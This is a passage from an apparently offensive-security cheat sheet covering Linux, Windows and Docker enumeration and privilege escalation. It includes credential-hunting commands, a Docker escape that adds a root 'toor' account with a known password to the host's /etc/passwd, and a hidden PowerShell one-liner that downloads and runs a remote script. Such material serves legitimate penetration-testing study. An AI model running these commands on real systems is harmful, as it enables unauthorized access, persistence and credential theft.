<span class="nb">ls</span> <span class="nt">-lahd</span> /etc/ld.so.conf.d/
<span class="nb">ls</span> <span class="nt">-lah</span> /etc/ld.so.conf.d/</code></pre></div></div></li> <li>Follow <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#ldconfig">this</a> if ld.so.conf can be modified</li> <li>Check udev rules:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-lah</span> /etc/udev/rules.d
<span class="nb">ls</span> <span class="nt">-lahd</span> /etc/udev/rules.d</code></pre></div></div></li> <li>List disk/partitions:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /dev

<span class="nb">ls</span> /dev/mapper

<span class="c"># List partitions</span>
fdisk <span class="nt">-l</span> /dev/sda

blkid /dev/sda

<span class="nb">cat</span> /proc/partitions

<span class="c"># Mounted</span>
mount

<span class="nb">cat</span> /etc/mtab

<span class="nb">cat</span> /etc/fstab

<span class="nb">cat</span> /proc/mounts

<span class="c"># Swap</span>
swapon

<span class="nb">cat</span> /proc/swaps</code></pre></div></div></li> <li>Mount partitions:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Requires root</span>
mount /dev/sda2 &lt;path&gt;

<span class="c"># Doesn't require</span>
udisksctl mount <span class="nt">-b</span> /dev/sda2 &lt;path&gt;</code></pre></div></div></li> <li>Host and Domain identification:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># hostname</span>
<span class="nb">hostname</span>

<span class="c"># Long hostname</span>
<span class="nb">hostname</span> <span class="nt">-f</span>

<span class="c"># IPs for the hostname</span>
<span class="nb">hostname</span> <span class="nt">-i</span>

<span class="c"># NIS/YP Domain</span>
<span class="nb">hostname</span> <span class="nt">-y</span>

domainname

nisdomainname

ypdomainname

<span class="c"># DNS domain</span>
<span class="nb">hostname</span> <span class="nt">-d</span>

dnsdomainname</code></pre></div></div></li> <li>Get the interfaces:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Modern systems</span>
ip addr

<span class="c"># Not so modern</span>
ifconfig

<span class="c"># Old systems</span>
netstat <span class="nt">-ie</span></code></pre></div></div></li> <li>Check the routing table:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Modern systems</span>
ip route

<span class="c"># Not so modern</span>
route

<span class="c"># Old systems</span>
netstat <span class="nt">-r</span></code></pre></div></div></li> <li>Check the DNSs:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/resolv.conf</code></pre></div></div></li> <li>Check the hosts:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/hosts</code></pre></div></div></li> <li>Check the ARP table:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp

<span class="c"># BSD format</span>
arp <span class="nt">-a</span>

<span class="c"># Numeric output</span>
arp <span class="nt">-n</span></code></pre></div></div></li> <li>Check the sockets:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Modern systems</span>
ss <span class="nt">-tulnp</span>

<span class="c"># Old systems</span>
netstat <span class="nt">-anop</span></code></pre></div></div></li> <li>Check the firewall rules:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables <span class="nt">--list</span>
<span class="c"># Modern systems may use nftables</span></code></pre></div></div></li> <li>List running processes:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | less
<span class="c"># ps w in some systems</span></code></pre></div></div></li> <li>List drivers:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsmod

less /proc/modules</code></pre></div></div></li> <li>CPU and memory info:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less /proc/cpuinfo

less /proc/meminfo

<span class="c"># Stats</span>
<span class="nb">cat</span> /proc/uptime

less /proc/stat

less /proc/vmstat

less /proc/misc</code></pre></div></div></li> </ul> <h2 id="system-enumeration--windows"> <a href="#system-enumeration--windows" class="anchor-heading" aria-labelledby="system-enumeration--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <h3 id="system-enumeration--windows--cmd-exe"> <a href="#system-enumeration--windows--cmd-exe" class="anchor-heading" aria-labelledby="system-enumeration--windows--cmd-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> cmd.exe </h3> <ul> <li>List <a href="https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables">environment variables</a>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">%USERNAME%</span>

<span class="nb">echo</span> <span class="nv">%USERDOMAIN%</span>

<span class="nb">echo</span> <span class="nv">%USERPROFILE%</span>

<span class="nb">echo</span> <span class="nv">%PATH%</span>

<span class="c">:: Temporarily modify it</span>
<span class="kd">set</span> <span class="kd">PATH</span><span class="o">=</span><span class="nv">%PATH%</span><span class="o">;</span><span class="kd">C</span>:\&lt;path&gt;

<span class="c">:: Set it permanently (yes, no =)</span>
<span class="nb">setx</span> <span class="kd">PATH</span> <span class="nv">%PATH%</span><span class="o">;</span><span class="kd">C</span>:\&lt;path&gt;</code></pre></div></div></li> <li>Check if custom installation:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Both should be the same</span>
<span class="nb">echo</span> <span class="nv">%SystemRoot%</span>

<span class="nb">echo</span> <span class="nv">%WinDir%</span>
<span class="c">:: SystemRoot isn't defined in pre-NT</span></code></pre></div></div></li> <li>Find all users / user info:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: List all users</span>
<span class="nb">net</span> <span class="kd">user</span>

<span class="c">:: List extended user info</span>
<span class="nb">net</span> <span class="kd">user</span> <span class="o">&lt;</span><span class="kd">username</span><span class="o">&gt;</span>
<span class="c">:: Pay attention to the Local and Global Group memberships</span>

<span class="c">:: Enumerate all domain users</span>
<span class="nb">net</span> <span class="kd">user</span> <span class="na">/domain

</span><span class="c">:: List current account details</span>
<span class="nb">net</span> <span class="kd">accounts</span></code></pre></div></div></li> <li>List current user and hostname:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: May not be installed</span>
<span class="nb">whoami</span>

<span class="nb">hostname</span></code></pre></div></div></li> <li>List current user privileges:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> <span class="na">/priv</span></code></pre></div></div></li> <li>List OS and version:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">systeminfo</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="na">/B /C</span>:<span class="s2">"OS Name"</span> <span class="na">/C</span>:<span class="s2">"OS Version"</span> <span class="na">/C</span>:<span class="s2">"System Type"</span>

<span class="c">:: Alternatively try: msinfo32</span>
<span class="c">:: Note: msinfo32 may not be in PATH</span></code></pre></div></div></li> <li>List patches:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">qfe</span> <span class="kd">get</span> <span class="kd">Caption</span><span class="o">,</span><span class="kd">Description</span><span class="o">,</span><span class="kd">HotFixID</span><span class="o">,</span><span class="kd">InstalledOn</span></code></pre></div></div></li> <li>List .NET versions:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Useful for compiling C# exploits</span>
<span class="nb">dir</span> <span class="na">/a</span><span class="nl">:D</span> <span class="s2">"C:\WINDOWS\Microsoft.NET\Framework"</span>

<span class="c">:: Or query the registry</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="s2">"HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP"</span></code></pre></div></div></li> <li>List PowerShell versions and paths:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Try with different numbers</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine <span class="na">/v </span><span class="kd">PowerShellVersion</span>

<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine <span class="na">/v </span><span class="kd">ApplicationBase</span>

<span class="c">:: Custom PSs</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell <span class="na">/v </span><span class="kd">Path</span>
<span class="c">:: ^ Also check for ExecutionPolicy</span></code></pre></div></div></li> <li>Find files/directories:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> <span class="kd">C</span>:\

<span class="c">:: Show hidden and non-hidden content</span>
<span class="nb">dir</span> <span class="na">/a

</span><span class="c">:: List all recursively</span>
<span class="nb">dir</span> <span class="na">/s /a

</span><span class="c">:: Locate .txt files in the system</span>
<span class="nb">dir</span> <span class="na">/s </span><span class="o">*</span>.txt

<span class="c">:: Locate .bak files in the system</span>
<span class="nb">dir</span> <span class="na">/s </span><span class="o">*</span>.bak

<span class="c">:: List non-hidden recursively</span>
<span class="nb">dir</span> <span class="na">/s

</span><span class="c">:: Hidden content only</span>
<span class="nb">dir</span> <span class="na">/ah

</span><span class="c">:: Hidden content recursively</span>
<span class="nb">dir</span> <span class="na">/ah /s

</span><span class="c">:: Both hidden/non-hidden - simple</span>
<span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=*"</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'dir /b/a:-d'</span><span class="o">)</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">"</span><span class="vm">%i</span><span class="s2">"</span></code></pre></div></div></li> <li>Check folder permissions (<a href="https://ss64.com/nt/icacls.html">icacls</a>):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: WD: Write Perm | AD: Create Dir</span>
<span class="nb">icacls</span> <span class="o">&lt;</span><span class="nb">dir</span><span class="o">&gt;</span>
<span class="c">:: R: Read | X: Execute | I: Inherit</span></code></pre></div></div></li> <li>List possible passwords/credentials:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Files</span>
<span class="nb">dir</span> <span class="na">/s /a </span><span class="o">*</span><span class="kd">pass</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="kd">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="kd">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span>.config<span class="o">*</span>

<span class="nb">findstr</span> <span class="na">/si </span><span class="kd">password</span> <span class="o">*</span>.xml <span class="o">*</span>.ini <span class="o">*</span>.txt

<span class="c">:: Registry</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span> <span class="na">/f </span><span class="kd">password</span> <span class="na">/t </span><span class="kd">REG_SZ</span> <span class="na">/s

</span><span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span> <span class="na">/f </span><span class="kd">password</span> <span class="na">/t </span><span class="kd">REG_SZ</span> <span class="na">/s</span></code></pre></div></div></li> <li>PowerShell history:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> <span class="nv">%USERPROFILE%</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre></div></div></li> <li>Show the content/concat file(s):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> <span class="o">&lt;</span><span class="kd">file</span><span class="o">&gt;</span></code></pre></div></div></li> <li>List, mount, unmount disk volumes:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: List all volumes</span>
<span class="nb">mountvol</span>

<span class="c">:: Mount volume in D:</span>
<span class="nb">mountvol</span> <span class="kd">D</span>:\ \\<span class="o">?</span>\Volume<span class="o">{&lt;</span><span class="kd">guid</span><span class="o">&gt;}</span>\

<span class="c">:: Unmount D:</span>
<span class="nb">mountvol</span> <span class="kd">D</span>:\ <span class="na">/D</span></code></pre></div></div></li> <li>Find the type of a volume (CD-ROM):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Do this to find why cd D:\ returns</span>
<span class="c">::   &gt; The device is not ready</span>
<span class="nb">diskpart</span>

<span class="kd">list</span> <span class="kd">disk</span>

<span class="kd">select</span> <span class="kd">disk</span> <span class="m">0</span>

<span class="kd">list</span> <span class="kd">partition</span>

<span class="kd">select</span> <span class="kd">partition</span> <span class="m">1</span>

<span class="kd">list</span> <span class="kd">volume</span>
<span class="c">:: Check the type, FS...</span>
<span class="c">:: CD/DVD-ROM without a disk won't</span>
<span class="c">:: allow accessing it, thus the error</span></code></pre></div></div></li> <li>Disk repair tools (to then mount):<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chkdsk</span>
<span class="c">:: Add the /f flag to perform fixes</span>

<span class="nb">sfc</span> <span class="na">/scannow
</span><span class="c">:: Windows File Protecton fixer</span></code></pre></div></div></li> <li>Mount shares:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Map the share</span>
<span class="nb">net</span> <span class="kd">use</span> \\&lt;ip&gt;\&lt;path&gt;

<span class="c">:: Map the share to a label</span>
<span class="nb">net</span> <span class="kd">use</span> <span class="kd">E</span>: \\&lt;ip&gt;\&lt;path&gt;

<span class="c">:: Or mount the share to a folder</span>
<span class="nb">mklink</span> <span class="na">/d </span><span class="kd">C</span>:\&lt;path&gt; \\&lt;ip&gt;\&lt;path&gt;</code></pre></div></div></li> <li>List all interfaces:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ipconfig</span> <span class="na">/all</span></code></pre></div></div></li> <li>List routing table:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">route</span> <span class="nb">print</span></code></pre></div></div></li> <li>List ARP tables:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">arp</span> <span class="na">-a

</span><span class="nb">arp</span> <span class="na">-A</span></code></pre></div></div></li> <li>List all connections, state + pid:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netstat</span> <span class="na">-ano

</span><span class="c">:: Show only TCP</span>
<span class="nb">netstat</span> <span class="na">-anop </span><span class="kd">TCP</span></code></pre></div></div></li> <li>List firewall stated and configuration:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">firewall</span> <span class="kd">show</span> <span class="kd">state</span>

<span class="nb">netsh</span> <span class="kd">firewall</span> <span class="kd">show</span> <span class="kd">config</span></code></pre></div></div></li> <li>List firewall adv profile and rules:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">advfirewall</span> <span class="kd">show</span> <span class="kd">currentprofile</span>

<span class="nb">netsh</span> <span class="kd">advfirewall</span> <span class="kd">firewall</span> <span class="kd">show</span> <span class="kd">rule</span> <span class="kd">name</span><span class="o">=</span><span class="kd">all</span></code></pre></div></div></li> <li>List scheduled tasks:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="na">/v
</span><span class="c">:: A modified version exists for</span>
<span class="c">:: Win2K as well as JT.EXE</span></code></pre></div></div></li> <li>List running processes:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: All running processes</span>
<span class="nb">tasklist</span> <span class="na">/SVC

</span><span class="c">:: Process by match</span>
<span class="nb">tasklist</span> <span class="na">/FI </span><span class="s2">"IMAGENAME eq &lt;process&gt;"</span></code></pre></div></div></li> <li>List drivers and filter:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: List not found in C:\WINDOWS</span>
<span class="nb">driverquery</span> <span class="na">/v </span><span class="o">|</span> <span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"C:\WINDOWS"</span>

<span class="c">:: List only executed at boot</span>
<span class="nb">driverquery</span> <span class="na">/v </span><span class="o">|</span> <span class="nb">findstr</span> <span class="na">/i </span><span class="s2">"boot"</span>

<span class="c">:: List only running drivers</span>
<span class="nb">driverquery</span> <span class="na">/v </span><span class="o">|</span> <span class="nb">findstr</span> <span class="na">/i </span><span class="s2">"running"</span></code></pre></div></div></li> <li>List services and their permissions:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">list</span> <span class="kd">brief</span>

<span class="c">:: Using sc</span>
<span class="nb">sc</span> <span class="nb">query</span>

<span class="nb">sc</span> <span class="kd">qc</span> <span class="o">&lt;</span><span class="kd">service</span><span class="na">-name</span><span class="o">&gt;</span></code></pre></div></div></li> <li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a> multiple system permissions:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Accept terms</span>
<span class="kd">accesschk</span><span class="err">.exe</span> <span class="na">/accepteula

</span><span class="c">:: Service permissions</span>
<span class="kd">accesschk</span><span class="err">.exe</span> <span class="na">-ucqv </span><span class="o">*</span>

<span class="kd">accesschk</span><span class="err">.exe</span> <span class="na">-ucqv </span><span class="o">&lt;</span><span class="kd">service</span><span class="na">-name</span><span class="o">&gt;</span>

<span class="kd">accesschk</span><span class="err">.exe</span> <span class="na">-uwcqv </span><span class="s2">"Authenticated Users"</span> <span class="o">*</span>

<span class="c">:: Folders with weak permissions</span>
<span class="kd">accesschk</span><span class="err">.exe</span> <span class="na">-uwdqs </span><span class="kd">Users</span> <span class="kd">C</span>:\

<span class="kd">accesschk</span><span class="err">.exe</span> <span class="na">-uwdqs </span><span class="s2">"Authenticated Users"</span> <span class="kd">C</span>:\

<span class="c">:: Files with weak permissions</span>
<span class="kd">accesschk</span><span class="err">.exe</span> <span class="na">-uwqs </span><span class="kd">Users</span> <span class="kd">C</span>:\<span class="o">*</span>.<span class="o">*</span>

<span class="kd">accesschk</span><span class="err">.exe</span> <span class="na">-uwqs </span><span class="s2">"Authenticated Users"</span> <span class="kd">C</span>:\<span class="o">*</span>.<span class="o">*</span></code></pre></div></div></li> </ul> <h3 id="system-enumeration--windows--powershell"> <a href="#system-enumeration--windows--powershell" class="anchor-heading" aria-labelledby="system-enumeration--windows--powershell"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PowerShell </h3> <ul> <li>Check for current PS path:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="kd">Get</span><span class="na">-Process -Id </span>$pid<span class="o">)</span>.Path</code></pre></div></div></li> <li>Check for default PS:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="kd">Get</span><span class="na">-Command </span><span class="kd">PowerShell</span><span class="err">.exe</span><span class="o">)</span>.Path

<span class="c">:: Newer Windows</span>
<span class="o">(</span><span class="kd">Get</span><span class="na">-Command -Name </span><span class="kd">pwsh</span><span class="o">)</span>.Path</code></pre></div></div></li> <li>Check for current version:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: PS 2.0 and up</span>
$PSVersionTable.PSVersion.ToString<span class="o">()</span>

<span class="c">:: PS 1.0</span>
$host.Version</code></pre></div></div></li> <li>Check if running 64 bit PS:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Pointers are 8 bytes on x64 PS</span>
<span class="o">[</span><span class="kd">System</span>.IntPtr<span class="o">]</span>::Size <span class="na">-eq </span><span class="m">8</span>

<span class="c">:: Using the environment</span>
<span class="o">[</span><span class="kd">Environment</span><span class="o">]</span>::Is64BitProcess</code></pre></div></div></li> <li>Run a specific version:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">powershell</span> <span class="na">-version </span><span class="m">2</span></code></pre></div></div></li> <li>Check for a specific version:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">Get</span><span class="na">-WindowsOptionalFeature -Online -FeatureName </span><span class="kd">MicrosoftWindowsPowerShellV2</span>

<span class="c">:: Windows Server</span>
<span class="kd">Get</span><span class="na">-WindowsFeature </span><span class="kd">PowerShell</span><span class="na">-V</span><span class="m">2</span></code></pre></div></div></li> <li>Path list: <ul> <li>Windows 64 bit:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">%SystemRoot%</span>\System32\WindowsPowerShell\v1.0\powershell.exe

<span class="c">:: From 32 bit session</span>
<span class="nv">%SystemRoot%</span>\SysNative\WindowsPowerShell\v1.0\powershell.exe</code></pre></div></div></li> <li>Windows 32 bit:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">%SystemRoot%</span>\System32\WindowsPowerShell\v1.0\powershell.exe
<span class="c">:: Also try %WinDir%</span>

<span class="c">:: From 64 bit session</span>
<span class="nv">%SystemRoot%</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code></pre></div></div></li> </ul> </li> </ul> <h2 id="system-enumeration--docker"> <a href="#system-enumeration--docker" class="anchor-heading" aria-labelledby="system-enumeration--docker"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Docker </h2> <ul> <li>List the images:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker images</code></pre></div></div></li> <li>Check the history of an image:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker <span class="nb">history</span> <span class="nt">--no-trunc</span> &lt;img-hash&gt;</code></pre></div></div></li> <li>Run an interactive shell in the image:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--entrypoint</span><span class="o">=</span>/bin/sh &lt;img-hash&gt;</code></pre></div></div></li> <li>Mount the host&#8217;s filesystem and access it through docker:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /
docker run <span class="nt">-it</span> <span class="nt">-v</span> <span class="nv">$PWD</span>:/mnt <span class="nt">--entrypoint</span><span class="o">=</span>/bin/sh &lt;img-hash&gt;

<span class="c"># If you are root in Docker you'll be</span>
<span class="c"># able to access the host filesystem</span>
<span class="c"># also as root under /mnt</span>
<span class="nb">echo</span> <span class="s1">'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh'</span> <span class="o">&gt;&gt;</span> /mnt/etc/passwd
<span class="c"># Now you'll be able to su toor with</span>
<span class="c"># password: password on the host</span></code></pre></div></div></li> <li>If you don&#8217;t have any image available (or those available are restricted) you can use a socks tunnel to obtain a <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#docker">vulnerable one</a></li> </ul> <h1 id="system-monitoring"> <a href="#system-monitoring" class="anchor-heading" aria-labelledby="system-monitoring"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> System Monitoring </h1> <h2 id="system-monitoring--linux"> <a href="#system-monitoring--linux" class="anchor-heading" aria-labelledby="system-monitoring--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h2> <h3 id="system-monitoring--linux--pspy"> <a href="#system-monitoring--linux--pspy" class="anchor-heading" aria-labelledby="system-monitoring--linux--pspy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> pspy </h3> <ul> <li><a href="https://github.com/DominicBreuker/pspy">Site</a> - profs unprivileged info snoop:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -pf - Commands and System Events</span>
pspy <span class="nt">-pf</span> <span class="nt">-i</span> 1000
<span class="c"># -i &lt;ms&gt;  - Scan procfs every 1000ms</span>
<span class="c"># -r &lt;dir&gt; - Recursive dir watch</span>
<span class="c"># -d &lt;dir&gt; - Non-recursive dir watch</span></code></pre></div></div></li> </ul> <h1 id="system-vulnerability-enumeration"> <a href="#system-vulnerability-enumeration" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> System Vulnerability Enumeration </h1> <h2 id="system-vulnerability-enumeration--windows"> <a href="#system-vulnerability-enumeration--windows" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <h3 id="system-vulnerability-enumeration--windows--generic"> <a href="#system-vulnerability-enumeration--windows--generic" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--windows--generic"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Generic </h3> <h4 id="system-vulnerability-enumeration--windows--generic--winpeas"> <a href="#system-vulnerability-enumeration--windows--generic--winpeas" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--windows--generic--winpeas"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> winPEAS </h4> <ul> <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe#quick-start">winPEASexe</a> - .NET &gt;= 4.5 (Watson incl)</li> <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat">winPEASbat</a> - toggle the <code>long</code> variable</li> </ul> <h4 id="system-vulnerability-enumeration--windows--generic--windows-exploit-suggester"> <a href="#system-vulnerability-enumeration--windows--generic--windows-exploit-suggester" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--windows--generic--windows-exploit-suggester"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows-Exploit-Suggester </h4> <ul> <li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Site</a> - <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/48#issuecomment-756517137">unsupported xlsx fix</a><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Obtain the latest database</span>
windows-exploit-suggester.py <span class="nt">--update</span>

<span class="c"># Suggest based on systeminfo output</span>
windows-exploit-suggester.py <span class="nt">--database</span> &lt;database&gt; <span class="nt">--systeminfo</span> &lt;file-with-systeminfo-output&gt;</code></pre></div></div></li> </ul> <h3 id="system-vulnerability-enumeration--windows--kernel"> <a href="#system-vulnerability-enumeration--windows--kernel" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--windows--kernel"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Kernel </h3> <h4 id="system-vulnerability-enumeration--windows--kernel--sherlock"> <a href="#system-vulnerability-enumeration--windows--kernel--sherlock" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--windows--kernel--sherlock"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Sherlock </h4> <ul> <li>PowerShell x86/x64</li> <li><a href="https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1">Download</a></li> <li>Usage:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Use the appropriate PS (x86/x64)</span>
<span class="kd">powershell</span><span class="err">.exe</span> <span class="na">-Exec </span><span class="kd">Bypass</span> <span class="na">-nop -w </span><span class="kd">Hidden</span> <span class="na">-NoLogo -NonInteractive -Command </span><span class="s2">"IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;/Sherlock.ps1'); Find-AllVulns"</span></code></pre></div></div></li> </ul> <h2 id="system-vulnerability-enumeration--linux"> <a href="#system-vulnerability-enumeration--linux" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h2> <h3 id="system-vulnerability-enumeration--linux--generic"> <a href="#system-vulnerability-enumeration--linux--generic" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--linux--generic"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Generic </h3> <h4 id="system-vulnerability-enumeration--linux--generic--linpeas"> <a href="#system-vulnerability-enumeration--linux--generic--linpeas" class="anchor-heading" aria-labelledby="system-vulnerability-enumeration--linux--generic--linpeas"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> linPEAS </h4> <ul> <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS#quick-start">linPEAS.sh</a> - Run with <code>-a</code>, use <code>-P &lt;pwd&gt;</code></li> </ul> <h1 id="folders-enumeration"> <a href="#folders-enumeration" class="anchor-heading" aria-labelledby="folders-enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Folders Enumeration </h1> <h2 id="folders-enumeration--windows"> <a href="#folders-enumeration--windows" class="anchor-heading" aria-labelledby="folders-enumeration--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows 